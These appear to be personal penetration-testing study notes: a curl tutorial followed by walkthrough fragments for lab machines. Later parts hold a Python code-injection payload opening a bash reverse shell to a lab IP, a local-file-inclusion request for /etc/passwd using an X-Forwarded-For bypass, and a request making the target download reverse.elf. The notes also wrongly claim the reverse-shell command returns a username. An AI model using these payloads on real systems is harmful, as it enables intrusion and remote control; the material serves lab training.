```
curl -X POST -H "Content-Type: application/json" -d '{"user": "admin", "cmd": "id"}' http://192.168.1.100/api/v1/exec
```

## 1. Understand the HTTP/Terminal Blueprint

To be comfortable with `curl`, you have to stop looking at it as a random command and start looking at it as a direct translation of raw HTTP.

Every web request consists of a **Method** (GET, POST), a **Target** (URL/Endpoint), **Headers** (Metadata), and an optional **Body** (Data). `curl` simply maps flags directly to these components:

|**HTTP Component**|**curl Flag**|**Purpose**|
|---|---|---|
|**The Method**|`-X`|Explicitly sets `GET`, `POST`, `PUT`, `DELETE`|
|**The Headers**|`-H`|Sends metadata (e.g., `-H "Content-Type: application/json"`)|
|**The Body (Form)**|`-d` or `--data`|Sends standard URL-encoded form data|
|**The Body (JSON)**|`-d '{"key":"val"}'`|Sends structured JSON payloads|
|**The Response**|`-i` or `-v`|Tells `curl` to show you the headers/verbose output back|

## 2. Master the "Big Three" Penetration Testing Scenarios

You do not need to learn all of `curl`'s hundreds of flags. For 95% of security boxes and the OSCP, you only need to master three specific templates. Practice these on a local lab or a safe target until they are muscle memory:

### Scenario A: The Basic Inspection (Always start here)

Before exploiting anything, you need to see what the server is returning, including cookies and hidden headers.

Bash

```
curl -i http://192.168.1.100/index.php
```

- _Why:_ The `-i` flag prints the HTTP response headers (like `Set-Cookie`, `Server: Apache`, or custom headers) along with the HTML.
    

### Scenario B: Submitting a Standard Login Form (POST)

When a website handles a login or a standard contact form, it usually sends `application/x-www-form-urlencoded` data.

Bash

```
curl -X POST -d "username=admin&password=password123" http://192.168.1.100/login.php
```

- _Why:_ The `-d` flag automatically tells `curl` this is a `POST` request and packages the credentials exactly like a web browser would.
    

### Scenario C: Interacting with an API or Modern App (JSON POST)

Many modern application vulnerabilities require you to send JSON payloads to an API endpoint.

Bash

```
curl -X POST -H "Content-Type: application/json" -d '{"user": "admin", "cmd": "id"}' http://192.168.1.100/api/v1/exec
```

- _Why:_ If you don't supply the `-H` Content-Type header, the server won't know how to parse the JSON body in the `-d` flag, and the request will fail.
    

## 3. Use the "Burp Suite Cheat Code" to Practice

If you are struggling to write `curl` commands from scratch, let your tools teach you.

1. Intercept a web request in **Burp Suite** (or open your browser's Developer Tools by pressing `F12` and going to the **Network** tab).
    
2. Right-click on the specific HTTP request.
    
3. Select **Copy as curl command** (or _Copy -> Copy as cURL (POSIX)_).
    
4. Paste it into a text editor and study it.
    

By looking at how Burp translates a visual web request into a single terminal string, you will quickly learn exactly how headers, cookies, and data parameters are structured in the command line.

## 4. How to Patch the Gap (Action Plan)

Instead of jumping straight back into hard boxes like Hetemit, build your confidence on structured, lower-stakes environments:

- **PortSwigger Web Security Academy:** It is completely free and the absolute best resource for web testing. Try solving their basic SQL injection, Command Injection, or Broken Authentication labs using _only_ your terminal and `curl` instead of a browser.
    
- **TryHackMe (Web Fundamentals Pathway):** This will reinforce how the HTTP protocol operates underneath the hood.
    
- **Create a Cheat Sheet:** Open a local notes file and write down your own templates for a GET request, a Form POST request, a JSON POST request, and a request that includes a session Cookie (`-b "session=XYZ"`). When you hit a web app phase on a box, refer to your cheat sheet instead of guessing the syntax.
    

Once sending a payload via `curl` feels as natural as typing `ls` or `cd`, you will find that complex targets like Hetemit become significantly less overwhelming.

---

## Pivoting Based on Your Burp Output

Now we go back to the exact output you discovered in Burp Suite and why your instinct to look at the `{'code'}` response was actually the correct path.

When you sent a request to `/verify`, the server responded with:

JSON

```
HTTP/1.0 200 OK
Server: Werkzeug/1.0.1 Python/3.6.8

{'code'}
```

As we analyzed earlier, the application is directly telling you it is looking for a parameter named `code`. Since the debugger is closed, this `/verify` endpoint is a **custom-built application feature**, not an official Werkzeug error page.

### The Underlying Vulnerability: Server-Side Code Execution

When a Python web application asks for a parameter named `code` on a verification page, takes your input, and evaluates it, it is often passing that input straight into Python's native evaluation functions (like `eval()` or `exec()`).

If it does this without strict sanitization, it creates a **Server-Side Code Injection** vulnerability.

## The Correct Thinking Process to Manually Test It

Since the script failed, you must test this manually. Let’s use the `curl` terminal methodology we discussed to see if the server executes Python code when passed through the `code` parameter.

### Step 1: Send a Simple Numeric Test

Test if the server evaluates mathematical operations. We will pass `code` as a standard POST request parameter using `curl`:

Bash

```
curl -i http://192.168.175.117:50000/verify -X POST --data "code=5*5"
```

- **What to observe:** Look closely at the response body. If the server returns `{'code'}` or an error, it didn't evaluate it. If the server returns **`25`**, you have verified absolute confirmation that the server is taking your string and executing it as live Python code.
    

### Step 2: Transition to System Commands

If the mathematical test works and returns the evaluated answer, a penetration tester's next step is to use Python's built-in libraries to talk to the underlying operating system.

In Python, you can import the `os` module inline to execute a system command and read its output using the following syntax:

Python

```
__import__('os').popen('command_here').read()
```

You can test this through `curl` to see what user context the web server is running under:

Bash

```
curl -i http://192.168.175.117:50000/verify -X POST \
--data-urlencode "code=__import__('os').popen('bash -i >& /dev/tcp/192.168.45.248/18000 0>&1').read()"
```

If this command returns a username (like `cmeeks`), you have successfully bypassed the broken public script and discovered a direct path to executing system commands via the terminal.

---

### 

X-Forwarded-For Header

"The X-Forwarded-For (XFF) header is a de-facto standard header for identifying the originating IP address of a client connecting to a web server through an HTTP proxy or a load balancer. When traffic is intercepted between clients and servers, server access logs contain the IP address of the proxy or load balancer only. To see the original IP address of the client, the X-Forwarded-For request header is used."

```powershell
GET /logs?file=/etc/passwd HTTP/1.1

Host: 192.168.209.134:13337

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Connection: keep-alive

Upgrade-Insecure-Requests: 1

Priority: u=0, i

X-Forwarded-For: 127.0.0.1

Content-Length: 6
```

Appended X-Forwarded-For: 127.0.0.1 to bypass

Included /logs?file=/etc/passwd in GET req

```powershell
{
"user":"clumsyadmin",
"url":"http://192.168.45.196:22/reverse.elf"
} 
```

Change Req to POST

## Curl request example

```powershell                                                                                                               
┌──(kali㉿kali)-[~/Desktop/PGPlay/XposedAPI]
└─$ curl http://192.168.209.134:13337/restart                            
<html>
    <head>
        <title>Remote Service Software Management API</title>
        <script>
            function restart(){
                if(confirm("Do you really want to restart the app?")){
                    var x = new XMLHttpRequest();
                    x.open("POST", document.URL.toString());
                    x.send('{"confirm":"true"}');
                    window.location.assign(window.location.origin.toString());
                }
            }
        </script>
    </head>
    <body>
    <script>restart()</script>
    </body>
</html> 

┌──(kali㉿kali)-[~/Desktop/PGPlay/XposedAPI]
└─$ curl http://192.168.209.134:13337/restart --data '{"confirm":"true"}'
Restart Successful.    
```